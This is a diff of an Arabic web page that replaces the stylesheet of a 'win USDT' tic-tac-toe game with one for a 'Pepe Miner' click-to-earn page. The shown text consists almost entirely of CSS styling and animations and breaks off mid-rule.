@@ -1,1481 +1,1063 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta name="theme-color" content="#0a0a15">
-    <title>لعبة X O — اربح USDT | PAID PLUS</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
-    <style>
-        * {
-            margin: 0; padding: 0; box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-            -webkit-touch-callout: none;
-            user-select: none; -webkit-user-select: none;
-            font-family: 'Cairo', sans-serif;
-        }
-
-        html, body {
-            width: 100%;
-            min-height: 100vh;
-            overflow-x: hidden;
-            background: #050510;
-            color: #fff;
-            position: relative;
-        }
-
-        body::before {
-            content: '';
-            position: fixed;
-            inset: 0;
-            background: 
-                radial-gradient(ellipse 80% 50% at 50% -20%, rgba(106,17,203,0.3), transparent),
-                radial-gradient(ellipse 60% 40% at 100% 100%, rgba(37,117,252,0.2), transparent),
-                radial-gradient(ellipse 60% 40% at 0% 100%, rgba(46,204,113,0.15), transparent),
-                #050510;
-            z-index: 0;
-        }
-
-        body::after {
-            content: '';
-            position: fixed;
-            inset: 0;
-            background-image: 
-                linear-gradient(rgba(106,17,203,0.04) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(106,17,203,0.04) 1px, transparent 1px);
-            background-size: 50px 50px;
-            z-index: 0;
-            pointer-events: none;
-            animation: gridMove 20s linear infinite;
-        }
-
-        @keyframes gridMove {
-            from { background-position: 0 0; }
-            to { background-position: 50px 50px; }
-        }
-
-        body > * { position: relative; z-index: 1; }
-
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 12px;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            min-height: 100vh;
-        }
-
-        .header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 14px 20px;
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
-            border-radius: 18px;
-            box-shadow: 
-                0 10px 40px rgba(106,17,203,0.5),
-                0 0 0 1px rgba(255,255,255,0.1),
-                inset 0 1px 0 rgba(255,255,255,0.2);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .header::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
-            animation: shine 4s infinite;
-        }
-
-        @keyframes shine {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-
-        .logo {
-            font-size: 17px;
-            font-weight: 900;
-            letter-spacing: 2px;
-            position: relative;
-            z-index: 2;
-            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
-        }
-
-        .back-btn {
-            color: #fff;
-            text-decoration: none;
-            font-size: 12px;
-            font-weight: 800;
-            padding: 8px 15px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.25);
-            position: relative;
-            z-index: 2;
-            transition: 0.25s;
-        }
-        .back-btn:active { transform: scale(0.94); background: rgba(255,255,255,0.3); }
-
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-        }
-
-        .stat {
-            background: linear-gradient(135deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02));
-            border: 1px solid rgba(255,255,255,0.08);
-            border-radius: 16px;
-            padding: 12px 8px;
-            text-align: center;
-            backdrop-filter: blur(10px);
-            transition: 0.3s;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .stat::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, currentColor, transparent);
-            opacity: 0.6;
-        }
-
-        .stat.win { color: #2ecc71; }
-        .stat.lose { color: #e74c3c; }
-        .stat.tie { color: #f39c12; }
-
-        .stat-label {
-            font-size: 10px;
-            color: #a0a0b0;
-            display: block;
-            margin-bottom: 4px;
-            font-weight: 700;
-            letter-spacing: 1px;
-        }
-
-        .stat-value {
-            font-size: 20px;
-            font-weight: 900;
-            direction: ltr;
-            display: block;
-            line-height: 1;
-            color: currentColor;
-            text-shadow: 0 0 15px currentColor;
-        }
-
-        .plays-bar {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background: linear-gradient(135deg, rgba(243,156,18,0.15), rgba(243,156,18,0.05));
-            border: 1px solid rgba(243,156,18,0.35);
-            border-radius: 14px;
-            padding: 11px 18px;
-            backdrop-filter: blur(10px);
-        }
-
-        .plays-label {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            color: #f39c12;
-            font-weight: 800;
-            font-size: 12px;
-        }
-
-        .plays-label svg { width: 15px; height: 15px; }
-
-        .plays-count {
-            font-size: 18px;
-            font-weight: 900;
-            color: #fff;
-            direction: ltr;
-            text-shadow: 0 0 12px rgba(243,156,18,0.6);
-        }
-
-        .cooldown-bar {
-            display: none;
-            align-items: center;
-            justify-content: space-between;
-            background: linear-gradient(135deg, rgba(231,76,60,0.15), rgba(192,57,43,0.05));
-            border: 1px solid rgba(231,76,60,0.4);
-            border-radius: 14px;
-            padding: 11px 18px;
-            backdrop-filter: blur(10px);
-            animation: cooldownPulse 2s ease-in-out infinite;
-        }
-
-        .cooldown-bar.show { display: flex; }
-
-        @keyframes cooldownPulse {
-            0%, 100% { border-color: rgba(231,76,60,0.4); box-shadow: 0 0 0 0 rgba(231,76,60,0); }
-            50% { border-color: rgba(231,76,60,0.7); box-shadow: 0 0 20px 0 rgba(231,76,60,0.2); }
-        }
-
-        .cooldown-label {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            color: #e74c3c;
-            font-weight: 800;
-            font-size: 11px;
-        }
-
-        .cooldown-label svg { width: 14px; height: 14px; animation: rotateClock 3s linear infinite; }
-
-        @keyframes rotateClock {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-
-        .cooldown-timer {
-            font-size: 15px;
-            font-weight: 900;
-            color: #fff;
-            direction: ltr;
-            font-family: 'Courier New', monospace;
-            letter-spacing: 1.5px;
-            text-shadow: 0 0 12px rgba(231,76,60,0.7);
-        }
-
-        .game-area {
-            background: 
-                radial-gradient(circle at 50% 0%, rgba(106,17,203,0.25), transparent 60%),
-                linear-gradient(180deg, rgba(26,26,46,0.95), rgba(10,10,20,0.98));
-            border-radius: 24px;
-            padding: 24px 20px;
-            border: 1px solid rgba(106,17,203,0.4);
-            box-shadow: 
-                0 25px 70px rgba(106,17,203,0.3),
-                0 0 0 1px rgba(255,255,255,0.05),
-                inset 0 1px 0 rgba(255,255,255,0.08);
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .game-area::before {
-            content: '';
-            position: absolute;
-            top: -100px; left: -100px;
-            width: 300px; height: 300px;
-            background: radial-gradient(circle, rgba(106,17,203,0.2), transparent 70%);
-            border-radius: 50%;
-            animation: floatBg 6s ease-in-out infinite;
-            pointer-events: none;
-        }
-
-        @keyframes floatBg {
-            0%, 100% { transform: translate(0, 0); }
-            50% { transform: translate(30px, 30px); }
-        }
-
-        .turn-indicator {
-            margin-bottom: 20px;
-            font-size: 16px;
-            font-weight: 900;
-            min-height: 28px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            position: relative;
-            z-index: 2;
-        }
-
-        .turn-indicator .you { 
-            color: #2ecc71; 
-            text-shadow: 0 0 20px rgba(46,204,113,0.9);
-            font-size: 20px;
-        }
-        .turn-indicator .robot { 
-            color: #e74c3c; 
-            text-shadow: 0 0 20px rgba(231,76,60,0.9);
-            font-size: 20px;
-        }
-
-        .board-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            grid-template-rows: repeat(3, 1fr);
-            gap: 12px;
-            max-width: 320px;
-            width: 100%;
-            margin: 0 auto 22px;
-            aspect-ratio: 1 / 1;
-            position: relative;
-            z-index: 2;
-        }
-
-        .cell {
-            background: 
-                linear-gradient(135deg, rgba(255,255,255,0.08), rgba(255,255,255,0.02));
-            border: 2px solid rgba(106,17,203,0.35);
-            border-radius: 18px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 52px;
-            font-weight: 900;
-            cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            position: relative;
-            overflow: hidden;
-            box-shadow: 
-                inset 0 1px 0 rgba(255,255,255,0.08),
-                0 4px 12px rgba(0,0,0,0.2);
-        }
-
-        .cell::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: radial-gradient(circle at 50% 50%, rgba(106,17,203,0.15), transparent 70%);
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-
-        .cell:not(.taken):not(.disabled):hover::before { opacity: 1; }
-        .cell:not(.taken):not(.disabled):active { transform: scale(0.94); }
-
-        .cell:not(.taken):not(.disabled):hover {
-            border-color: rgba(106,17,203,0.7);
-            box-shadow: 
-                inset 0 1px 0 rgba(255,255,255,0.1),
-                0 0 30px rgba(106,17,203,0.5);
-        }
-
-        .cell.taken { cursor: not-allowed; }
-        .cell.disabled { cursor: not-allowed; opacity: 0.5; }
-
-        .cell.x {
-            color: #2ecc71;
-            border-color: #2ecc71;
-            background: linear-gradient(135deg, rgba(46,204,113,0.2), rgba(46,204,113,0.05));
-            text-shadow: 0 0 20px rgba(46,204,113,1), 0 0 40px rgba(46,204,113,0.5);
-            box-shadow: 
-                inset 0 1px 0 rgba(255,255,255,0.1),
-                0 0 30px rgba(46,204,113,0.4);
-            animation: popIn 0.35s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-
-        .cell.o {
-            color: #e74c3c;
-            border-color: #e74c3c;
-            background: linear-gradient(135deg, rgba(231,76,60,0.2), rgba(231,76,60,0.05));
-            text-shadow: 0 0 20px rgba(231,76,60,1), 0 0 40px rgba(231,76,60,0.5);
-            box-shadow: 
-                inset 0 1px 0 rgba(255,255,255,0.1),
-                0 0 30px rgba(231,76,60,0.4);
-            animation: popIn 0.35s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-
-        @keyframes popIn {
-            0% { transform: scale(0.3) rotate(-10deg); opacity: 0; }
-            60% { transform: scale(1.1) rotate(3deg); }
-            100% { transform: scale(1) rotate(0deg); opacity: 1; }
-        }
-
-        .cell.win {
-            background: linear-gradient(135deg, rgba(46,204,113,0.4), rgba(38,161,123,0.3));
-            border-color: #2ecc71;
-            animation: winPulse 0.8s infinite;
-            box-shadow: 0 0 40px rgba(46,204,113,0.8), inset 0 0 30px rgba(46,204,113,0.3);
-        }
-
-        @keyframes winPulse {
-            0%, 100% { transform: scale(1); box-shadow: 0 0 40px rgba(46,204,113,0.8); }
-            50% { transform: scale(1.06); box-shadow: 0 0 60px rgba(46,204,113,1); }
-        }
-
-        .start-btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
-            color: #fff;
-            border: none;
-            padding: 15px 40px;
-            border-radius: 30px;
-            font-weight: 900;
-            font-size: 15px;
-            cursor: pointer;
-            font-family: 'Cairo', sans-serif;
-            transition: 0.3s;
-            box-shadow: 
-                0 12px 35px rgba(106,17,203,0.5),
-                inset 0 1px 0 rgba(255,255,255,0.2);
-            position: relative;
-            z-index: 2;
-            overflow: hidden;
-        }
-
-        .start-btn::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            transform: translateX(-100%);
-            transition: 0.6s;
-        }
-
-        .start-btn:not(:disabled):hover::before { transform: translateX(100%); }
-        .start-btn:active { transform: scale(0.95); }
-        .start-btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .start-btn svg { width: 16px; height: 16px; }
-
-        .balance-card {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            background: linear-gradient(135deg, #26a17b 0%, #2ecc71 100%);
-            border-radius: 20px;
-            padding: 16px 20px;
-            box-shadow: 
-                0 15px 40px rgba(38,161,123,0.5),
-                inset 0 1px 0 rgba(255,255,255,0.3);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .balance-card::before {
-            content: '';
-            position: absolute;
-            width: 180px;
-            height: 180px;
-            background: rgba(255,255,255,0.15);
-            border-radius: 50%;
-            top: -80px;
-            right: -50px;
-            animation: floatBall 5s ease-in-out infinite;
-        }
-
-        @keyframes floatBall {
-            0%, 100% { transform: translate(0, 0); }
-            50% { transform: translate(-20px, 15px); }
-        }
-
-        .balance-icon {
-            width: 48px;
-            height: 48px;
-            background: rgba(255,255,255,0.25);
-            border-radius: 14px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 7px;
-            position: relative;
-            z-index: 2;
-            backdrop-filter: blur(10px);
-            box-shadow: inset 0 1px 0 rgba(255,255,255,0.4);
-        }
-
-        .balance-icon img { width: 100%; height: 100%; object-fit: contain; }
-
-        .balance-info { flex: 1; position: relative; z-index: 2; }
-
-        .balance-label {
-            font-size: 11px;
-            color: rgba(255,255,255,0.95);
-            font-weight: 700;
-            margin-bottom: 4px;
-            letter-spacing: 1px;
-        }
-
-        .balance-value {
-            font-size: 22px;
-            font-weight: 900;
-            color: #fff;
-            direction: ltr;
-            display: flex;
-            align-items: baseline;
-            gap: 5px;
-            line-height: 1;
-            text-shadow: 0 2px 10px rgba(0,0,0,0.25);
-        }
-
-        .balance-symbol { font-size: 12px; opacity: 0.9; }
-
-        .withdraw-btn {
-            background: #fff;
-            color: #26a17b;
-            border: none;
-            padding: 12px 18px;
-            border-radius: 14px;
-            font-weight: 900;
-            font-size: 12px;
-            cursor: pointer;
-            font-family: 'Cairo', sans-serif;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            position: relative;
-            z-index: 2;
-            flex-shrink: 0;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.25);
-            transition: 0.3s;
-        }
-
-        .withdraw-btn:not(:disabled):hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 28px rgba(0,0,0,0.35);
-        }
-
-        .withdraw-btn:not(:disabled):active { transform: scale(0.94); }
-
-        .withdraw-btn:disabled {
-            background: rgba(255,255,255,0.35);
-            color: rgba(255,255,255,0.7);
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-
-        .withdraw-btn svg { width: 14px; height: 14px; }
-
-        .result-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(5,5,15,0.95);
-            backdrop-filter: blur(20px);
-            z-index: 999;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        .result-overlay.show {
-            display: flex;
-            animation: fadeIn 0.35s;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .result-box {
-            background: linear-gradient(160deg, #1a1a2e 0%, #0a0a15 100%);
-            border-radius: 28px;
-            padding: 36px 30px;
-            text-align: center;
-            max-width: 380px;
-            width: 100%;
-            box-shadow: 
-                0 30px 90px rgba(0,0,0,0.8),
-                0 0 0 1px rgba(255,255,255,0.08);
-            animation: slideUp 0.45s cubic-bezier(0.4, 0, 0.2, 1);
-            border: 1px solid rgba(255,255,255,0.08);
-        }
-
-        @keyframes slideUp {
-            from { transform: translateY(40px) scale(0.9); opacity: 0; }
-            to { transform: translateY(0) scale(1); opacity: 1; }
-        }
-
-        .result-icon {
-            width: 100px;
-            height: 100px;
-            margin: 0 auto 20px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 55px;
-            animation: resultIconPop 0.6s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-
-        @keyframes resultIconPop {
-            0% { transform: scale(0) rotate(-180deg); opacity: 0; }
-            60% { transform: scale(1.15) rotate(10deg); }
-            100% { transform: scale(1) rotate(0deg); opacity: 1; }
-        }
-
-        .result-icon.win {
-            background: linear-gradient(135deg, #26a17b, #2ecc71);
-            box-shadow: 0 20px 50px rgba(38,161,123,0.7), inset 0 0 40px rgba(255,255,255,0.3);
-        }
-
-        .result-icon.lose {
-            background: linear-gradient(135deg, #c0392b, #e74c3c);
-            box-shadow: 0 20px 50px rgba(231,76,60,0.7), inset 0 0 40px rgba(255,255,255,0.3);
-        }
-
-        .result-icon.tie {
-            background: linear-gradient(135deg, #d35400, #f39c12);
-            box-shadow: 0 20px 50px rgba(243,156,18,0.7), inset 0 0 40px rgba(255,255,255,0.3);
-        }
-
-        .result-title {
-            font-size: 28px;
-            font-weight: 900;
-            margin-bottom: 12px;
-        }
-
-        .result-title.win { color: #2ecc71; text-shadow: 0 0 25px rgba(46,204,113,0.7); }
-        .result-title.lose { color: #e74c3c; text-shadow: 0 0 25px rgba(231,76,60,0.7); }
-        .result-title.tie { color: #f39c12; text-shadow: 0 0 25px rgba(243,156,18,0.7); }
-
-        .result-prize {
-            font-size: 14px;
-            color: #a0a0b0;
-            margin-bottom: 24px;
-            line-height: 1.8;
-        }
-
-        .result-prize strong {
-            display: block;
-            font-size: 26px;
-            color: #2ecc71;
-            margin-top: 10px;
-            direction: ltr;
-            text-shadow: 0 0 20px rgba(46,204,113,0.7);
-            font-weight: 900;
-        }
-
-        .result-btn {
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
-            color: #fff;
-            border: none;
-            padding: 15px 45px;
-            border-radius: 30px;
-            font-family: 'Cairo', sans-serif;
-            font-size: 15px;
-            font-weight: 900;
-            cursor: pointer;
-            transition: 0.3s;
-            box-shadow: 0 15px 35px rgba(106,17,203,0.6), inset 0 1px 0 rgba(255,255,255,0.2);
-        }
-
-        .result-btn:hover { transform: translateY(-2px); }
-        .result-btn:active { transform: scale(0.95); }
-
-        .withdraw-modal {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.95);
-            backdrop-filter: blur(20px);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
-            padding: 15px;
-            overflow-y: auto;
-        }
-
-        .withdraw-modal.show { display: flex; }
-
-        .withdraw-content {
-            background: linear-gradient(160deg, #1a1a2e, #0a0a15);
-            border-radius: 26px;
-            padding: 30px 24px;
-            max-width: 420px;
-            width: 100%;
-            position: relative;
-            box-shadow: 0 35px 90px rgba(0,0,0,0.85), 0 0 0 1px rgba(255,255,255,0.08);
-            color: #fff;
-        }
-
-        .modal-close {
-            position: absolute;
-            top: 16px;
-            left: 16px;
-            width: 36px;
-            height: 36px;
-            background: rgba(255,255,255,0.08);
-            border: none;
-            border-radius: 50%;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: 0.3s;
-        }
-
-        .modal-close:active { transform: scale(0.9); background: rgba(255,0,0,0.25); }
-        .modal-close svg { width: 16px; height: 16px; color: #fff; }
-
-        .modal-title {
-            text-align: center;
-            font-size: 20px;
-            font-weight: 900;
-            margin-bottom: 20px;
-            background: linear-gradient(135deg, #f0b90b, #fcd535);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .frozen-balance {
-            background: linear-gradient(135deg, rgba(38,161,123,0.18), rgba(46,204,113,0.08));
-            border: 2px solid rgba(38,161,123,0.4);
-            border-radius: 16px;
-            padding: 18px;
-            text-align: center;
-            margin-bottom: 20px;
-            box-shadow: inset 0 0 20px rgba(38,161,123,0.1);
-        }
-
-        .frozen-label {
-            font-size: 11px;
-            color: #a0a0b0;
-            font-weight: 700;
-            margin-bottom: 8px;
-            letter-spacing: 1px;
-        }
-
-        .frozen-amount {
-            font-size: 28px;
-            font-weight: 900;
-            color: #26a17b;
-            direction: ltr;
-            line-height: 1;
-            text-shadow: 0 0 20px rgba(38,161,123,0.7);
-        }
-
-        .frozen-amount small { font-size: 13px; opacity: 0.85; }
-
-        .form-group { margin-bottom: 16px; }
-
-        .form-group label {
-            display: block;
-            font-size: 12px;
-            font-weight: 800;
-            margin-bottom: 7px;
-            color: #fff;
-            letter-spacing: 0.5px;
-        }
-
-        .form-group label::after {
-            content: ' *';
-            color: #e74c3c;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 2px solid rgba(255,255,255,0.1);
-            border-radius: 13px;
-            background: rgba(255,255,255,0.04);
-            color: #fff;
-            font-family: 'Cairo', sans-serif;
-            font-size: 14px;
-            font-weight: 700;
-            transition: 0.3s;
-        }
-
-        .form-group input:focus {
-            outline: none;
-            border-color: #f0b90b;
-            box-shadow: 0 0 0 4px rgba(240,185,11,0.15);
-            background: rgba(255,255,255,0.06);
-        }
-
-        .form-group input::placeholder { color: rgba(255,255,255,0.3); }
-
-        .submit-btn {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 15px;
-            background: linear-gradient(135deg, #f0b90b, #fcd535);
-            color: #1a1a2e;
-            font-family: 'Cairo', sans-serif;
-            font-size: 15px;
-            font-weight: 900;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 18px;
-            box-shadow: 0 12px 30px rgba(240,185,11,0.5);
-            transition: 0.3s;
-        }
-
-        .submit-btn:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 40px rgba(240,185,11,0.7);
-        }
-
-        .submit-btn:active { transform: scale(0.98); }
-        .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; }
-
-        .success-box { text-align: center; padding: 15px 0; }
-        .success-icon {
-            width: 80px; height: 80px; margin: 0 auto 20px;
-            background: linear-gradient(135deg, #26a17b, #2ecc71);
-            border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            box-shadow: 0 20px 50px rgba(38,161,123,0.6);
-            animation: resultIconPop 0.6s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-        .success-icon svg { width: 42px; height: 42px; color: #fff; }
-        .success-title { font-size: 21px; font-weight: 900; color: #26a17b; margin-bottom: 12px; }
-        .success-text { font-size: 13px; color: #a0a0b0; line-height: 1.9; margin-bottom: 18px; }
-        .success-text b { color: #26a17b; font-size: 15px; }
-
-        @media (max-width: 400px) {
-            .container { padding: 10px; gap: 10px; }
-            .board-grid { max-width: 280px; gap: 10px; }
-            .cell { font-size: 44px; border-radius: 14px; }
-            .balance-value { font-size: 19px; }
-            .logo { font-size: 15px; }
-            .result-title { font-size: 24px; }
-            .result-prize strong { font-size: 22px; }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>بيبي ماینر | Pepe Miner | PAID PLUS</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif; -webkit-tap-highlight-color: transparent; user-select: none; -webkit-user-select: none; }
+
+  :root {
+    --green: #22c55e;
+    --green-bright: #4ade80;
+    --green-dark: #15803d;
+    --gold: #fbbf24;
+    --red: #ef4444;
+    --bg: #050810;
+    --card: rgba(255,255,255,0.04);
+    --border: rgba(255,255,255,0.08);
+    --text: #e2e8f0;
+    --text-dim: #64748b;
+  }
+
+  html, body {
+    width: 100%;
+    min-height: 100vh;
+  }
+
+  body {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background: radial-gradient(circle at 50% 10%, #14213d 0%, #050810 60%);
+    color: var(--text);
+    padding: 20px;
+    overflow-x: hidden;
+    transition: background 0.8s ease;
+  }
+
+  body.burst-mode { background: radial-gradient(circle at 50% 10%, #14532d 0%, #050810 60%); }
+  body.mining-mode { background: radial-gradient(circle at 50% 10%, #0f3d2e 0%, #050810 60%); }
+
+  /* ===== الهيدر ===== */
+  .header {
+    text-align: center;
+    margin-bottom: 20px;
+    width: 100%;
+    max-width: 400px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 12px 16px;
+    background: linear-gradient(135deg, rgba(34,197,94,0.15), rgba(34,197,94,0.05));
+    border: 1px solid rgba(34,197,94,0.25);
+    border-radius: 16px;
+  }
+
+  .logo-text {
+    font-size: 1.5rem;
+    font-weight: 800;
+    letter-spacing: 4px;
+    background: linear-gradient(135deg, #4ade80, #22c55e, #15803d);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+  }
+
+  .back-btn {
+    color: #fff;
+    text-decoration: none;
+    font-size: 11px;
+    font-weight: 800;
+    padding: 6px 12px;
+    background: rgba(106,17,203,0.6);
+    border-radius: 18px;
+    border: 1px solid rgba(255,255,255,0.15);
+    transition: 0.3s;
+  }
+  .back-btn:active { transform: scale(0.94); }
+
+  .main-card {
+    width: 100%;
+    max-width: 400px;
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 24px;
+    padding: 24px 20px;
+    backdrop-filter: blur(14px);
+    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+    margin-bottom: 20px;
+  }
+
+  .balance-card {
+    background: linear-gradient(135deg, rgba(34,197,94,0.12), rgba(34,197,94,0.02));
+    border: 1px solid rgba(34,197,94,0.2);
+    border-radius: 16px;
+    padding: 16px;
+    text-align: center;
+    margin-bottom: 20px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .balance-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(74,222,128,0.15), transparent);
+    animation: shine 3.5s infinite;
+  }
+
+  @keyframes shine {
+    0% { left: -100%; }
+    100% { left: 100%; }
+  }
+
+  .balance-label {
+    font-size: 0.7rem;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+    margin-bottom: 8px;
+    font-weight: 700;
+  }
+
+  .balance-value {
+    font-family: 'Courier New', monospace;
+    font-size: 2rem;
+    font-weight: 700;
+    color: var(--green-bright);
+    letter-spacing: 2px;
+    text-shadow: 0 0 25px rgba(74,222,128,0.6);
+    transition: transform 0.15s ease;
+  }
+
+  .balance-value.bump { transform: scale(1.06); }
+
+  .balance-unit {
+    font-size: 0.75rem;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+    margin-top: 6px;
+  }
+
+  .timer-card {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: rgba(251,191,36,0.06);
+    border: 1px solid rgba(251,191,36,0.2);
+    border-radius: 14px;
+    padding: 12px 18px;
+    margin-bottom: 20px;
+  }
+
+  .timer-label {
+    font-size: 0.75rem;
+    color: #94a3b8;
+    letter-spacing: 2px;
+  }
+
+  .timer-value {
+    font-family: 'Courier New', monospace;
+    font-size: 1.5rem;
+    font-weight: 700;
+    color: var(--gold);
+    letter-spacing: 3px;
+    text-shadow: 0 0 20px rgba(251,191,36,0.5);
+    direction: ltr;
+  }
+
+  .pepe-stage {
+    position: relative;
+    width: 100%;
+    height: 280px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .counter {
+    font-family: 'Courier New', monospace;
+    font-size: 2.6rem;
+    font-weight: 700;
+    color: var(--green-bright);
+    letter-spacing: 2px;
+    text-shadow: 0 0 30px rgba(74,222,128,0.7);
+    margin-bottom: 18px;
+    transition: transform 0.15s ease;
+    line-height: 1;
+  }
+
+  .counter.earning { animation: counterPulse 0.15s ease; }
+
+  @keyframes counterPulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.08); }
+    100% { transform: scale(1); }
+  }
+
+  .pepe-wrap {
+    position: relative;
+    width: 180px;
+    height: 180px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .ring {
+    position: absolute;
+    border-radius: 50%;
+    border: 1px solid rgba(34,197,94,0.12);
+    pointer-events: none;
+    transition: border-color 0.4s;
+  }
+  .ring-1 { width: 170px; height: 170px; }
+  .ring-2 { width: 200px; height: 200px; border-style: dashed; animation: spin 25s linear infinite; }
+  .ring-3 { width: 230px; height: 230px; border-color: rgba(34,197,94,0.06); }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .pepe {
+    width: 130px;
+    height: 130px;
+    border-radius: 50%;
+    cursor: pointer;
+    object-fit: cover;
+    z-index: 2;
+    box-shadow:
+      0 0 0 3px rgba(34,197,94,0.25),
+      0 0 35px rgba(34,197,94,0.4);
+    transition: box-shadow 0.3s, filter 0.3s;
+  }
+
+  .pepe:hover { filter: brightness(1.15); }
+
+  .pepe.burst {
+    animation: shake 0.15s infinite;
+    box-shadow:
+      0 0 0 5px rgba(34,197,94,0.7),
+      0 0 60px rgba(74,222,128,0.9),
+      0 0 100px rgba(74,222,128,0.5);
+  }
+
+  @keyframes shake {
+    0%   { transform: translate(0, 0) rotate(0deg); }
+    20%  { transform: translate(-3px, 2px) rotate(-2deg); }
+    40%  { transform: translate(3px, -2px) rotate(2deg); }
+    60%  { transform: translate(-2px, -3px) rotate(-1deg); }
+    80%  { transform: translate(2px, 3px) rotate(1deg); }
+    100% { transform: translate(0, 0) rotate(0deg); }
+  }
+
+  .pepe.auto-mining {
+    animation: breathe 2.5s ease-in-out infinite;
+    box-shadow:
+      0 0 0 3px rgba(34,197,94,0.3),
+      0 0 45px rgba(34,197,94,0.6);
+  }
+
+  @keyframes breathe {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.04); }
+  }
+
+  .progress-wrap {
+    width: 100%;
+    max-width: 260px;
+    height: 5px;
+    background: rgba(255,255,255,0.05);
+    border-radius: 10px;
+    overflow: hidden;
+    margin-top: 18px;
+    opacity: 0;
+    transition: opacity 0.4s;
+  }
+
+  .progress-wrap.visible { opacity: 1; }
+
+  .progress-bar {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #16a34a, #4ade80);
+    border-radius: 10px;
+    transition: width 0.1s linear;
